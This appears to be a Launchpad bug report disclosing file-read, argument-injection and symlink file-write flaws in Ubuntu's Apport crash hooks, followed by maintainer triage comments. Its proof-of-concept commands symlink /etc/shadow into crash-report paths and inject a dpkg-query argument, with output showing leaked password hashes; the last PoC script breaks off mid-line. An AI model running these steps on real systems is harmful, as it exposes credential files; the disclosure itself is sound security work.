### Bug Description

# Vulnerabilities in Apport

During a cursory code review, several potential security issues in `apport` and crash-related hooks in packages such as `Xorg` and `openjdk-14-lts` have been identified.

While the issue regarding the `openjdk-14-lts` package is exploitable

on default installations, the remaining issues most likely are mitigated by the sysctl setting `fs.protected\_symlinks` on default Ubuntu installations.

With regard to issues mitigated by `fs.protected\_symlinks`, it is not clear if they are considered to be part of the threat model, but nonetheless will be included in this report. Further, if the issues regarding package hooks should be reported in the corresponding packages' bug tracker, please let me know.

## Issue 1: Arbitrary file read in package-hooks/source\_openjdk-\*.py

The `add\_info()` function allows for a directory traversal by building a file path using user-controlled data without properly sanitizing the resulting path.

```Python

def add\_info(report, ui=None):

    if report['ProblemType'] == 'Crash' and 'ProcCwd' in report:

        # attach hs\_err\_<pid>.pid file

        cwd = report['ProcCwd']

        pid\_line = re.search("Pid:\t(.\*)\n", report["ProcStatus"])

        if pid\_line:

            pid = pid\_line.groups()[0]

            path = "%s/hs\_err\_pid%s.log" % (cwd, pid)

            # make sure if exists

            if os.path.exists(path):

                content = read\_file(path)

                # truncate if bigger than 100 KB

                # see LP: [#1696814](/bugs/1696814)

                max\_length = 100\*1024

                if sys.getsizeof(content) < max\_length:

                    report['HotspotError'] = content

                    report['Tags'] += ' openjdk-hs-err'

                else:

                    report['HotspotError'] = content[:max\_length] + \

                            "\n[truncated by openjdk-11 apport hook]" + \

                            "\n[max log size is %s, file size was %s]" % \

                            (si\_units(max\_length), si\_units(sys.getsizeof(content)))

                    report['Tags'] += ' openjdk-hs-err'

```

By injecting a `ProcCwd` such as `/home/user/` and a `Pid` such as `0`, the function includes an arbitrary file by following a potential symbolic link `/home/user/hs\_err\_pid0.log`.

### PoC

```

$ sudo apt install openjdk-14-jdk

$ sudo sysctl fs.protected\_symlinks

fs.protected\_symlinks = 1

$ ln -s /etc/shadow /home/user/hs\_err\_pid0.log

$ pid=$'\t0';cat << EOF > /var/crash/poc.crash

ProblemType: Crash

ExecutablePath: /poc

Package: openjdk-lts 123

SourcePackage: openjdk-lts

ProcCwd: /home/user

ProcStatus:

 Pid:$pid

 Uid:$pid

EOF

$ grep -A3 root: /var/crash/poc.crash

 root:!:18393:0:99999:7:::

 daemon:\*:18375:0:99999:7:::

 bin:\*:18375:0:99999:7:::

 sys:\*:18375:0:99999:7:::

```

## Issue 2: Arbitrary file read in package-hooks/source\_xorg.py (Info)

The root cause of this issue stems from the fact, that a potentially

user-controlled file in the `/tmp` directory is not checked for being a symbolic link and therefore might allow including arbitrary files in the processed crash report:

Note: Requires `fs.protected\_symlinks=0`

```Python

def attach\_3d\_info(report, ui=None):

    ...

# Compiz internal state if compiz crashed

    if True or report.get('SourcePackage','Unknown') == "compiz" and "ProcStatus" in report:

        compiz\_pid = 0

        pid\_line = re.search("Pid:\t(.\*)\n", report["ProcStatus"])

        if pid\_line:

            compiz\_pid = pid\_line.groups()[0]

        compiz\_state\_file = '/tmp/compiz\_internal\_state%s' % compiz\_pid

        attach\_file\_if\_exists(report, compiz\_state\_file, "compiz\_internal\_states")

```

### PoC

```

$ sudo sysctl fs.protected\_symlinks=0

fs.protected\_symlinks = 0

$ ln -s /etc/shadow /tmp/compiz\_internal\_state0

$ cat << EOF > /var/crash/poc.crash

ProblemType: Crash

ExecutablePath: /poc

Package: source\_xorg 123

SourcePackage: compiz

ProcStatus:

 Pid:

EOF

$ grep -A3 compiz\_internal poc.crash

compiz\_internal\_states:

 root:!:18686:0:99999:7:::

 daemon:\*:18474:0:99999:7:::

 bin:\*:18474:0:99999:7:::

```

## Issue 3: Spoof modified config files via argument injection (Info)

The `get\_modified\_conffiles()` function allows to spoof modified configuration files by a controlled package name:

```Python

def get\_modified\_conffiles(self, package):

...

    dpkg = subprocess.Popen(['dpkg-query', '-W', '--showformat=${Conffiles}',

                              package], stdout=subprocess.PIPE)

```

By supplying a `package` name such as

`--showformat='${Conffiles;6}shadow 1\n'` it is possible to manipulate dpkg-query's output and therefore to include the `shadow` file in the resulting crash report.

Please note however that this function is seemingly only called in the `attach\_conffiles()` function, which subsequently requires a UI response

of the user to finally include the file in the crash report.

### PoC

```

$ dpkg-query -W --showformat='${Conffiles}' --showformat='${Conffiles;6}shadow 1\n' | head -n2

 /etc/shadow 1

      shadow 1

```

## Issue 4: Arbitrary file write in whoopsie-upload-all (Info)

After adding additional information to the crash file, `whoopsie-upload-all` does not check if the crash file was replaced by a symbolic link before writing the extended report back into the file. Thus, replacing the crash file with a symbolic link allows to write into arbitrary files using `whoopsie-upload-all`'s elevated privileges. By using a program's lax configuration parsing (e.g. `logrotate`), this might lead to code execution.

Note: Requires `fs.protected\_symlinks=0`

```Python

def process\_report(report):

    '''Collect information for a report and mark for whoopsie upload

    ...

        # write updated report, we use os.open and os.fdopen as

        # /proc/sys/fs/protected\_regular is set to 1 (LP: [#1848064](/bugs/1848064))

        fd = os.open(report, os.O\_WRONLY | os.O\_APPEND)

        with os.fdopen(fd, 'wb') as f:

            os.chmod(report, 0)

            r.write(f, only\_new=True)

            os.chmod(report, 0o640)

```

### PoC

```

$ sudo sysctl fs.protected\_symlinks

fs.protected\_symlinks = 0

$ cat ex.sh

TARGET="/JRN"

while :; do

  FN="/var/crash/$RANDOM.poc.crash"

  pid=$'\t0';cat << EOF > $FN

The bug was overlooked as it was filed against the upstream Apport project which isn't monitored. I've reassigned it to the apport package in Ubuntu now, and I'll take a look this week.

I'm not sure about the fs.protected\_symlinks aspect -- perhaps some apport users need to have this feature disabled for some reason, we shouldn't leave them entirely out in the cold -- but the fact that a simple configuration option that we turn on by default mitigates this entire class of problems is compelling.

Should we raise the fs.protected\_symlinks handling on oss-security for wider discussion? Perhaps it's time we just treat that as an expected kernel feature.

Hello,

thank you for handling this and sorry for filing the bug against the upstream Apport project.

As for the fs.protected\_symlinks handling, I'm very much interested in a wider discussion. I'm leaning towards treating that to be an expected mitigation but I'm more than interested in getting opinions from the community.

Thanks,

maik

I will be working on patches for these issues today. Once we have an appropriate set of patches, I will check if Debian ships the affected scripts too, and will coordinate a proper CRD.

Marc, sorry for the delay, we have a national holiday today.

I tested it against a default Ubuntu 20.04 installation.

Regarding the patches, I'm not entirely sure if they are the correct ones, I only find references to pam\_faillock. Sorry if I missed something, I just quickly glanced over them.
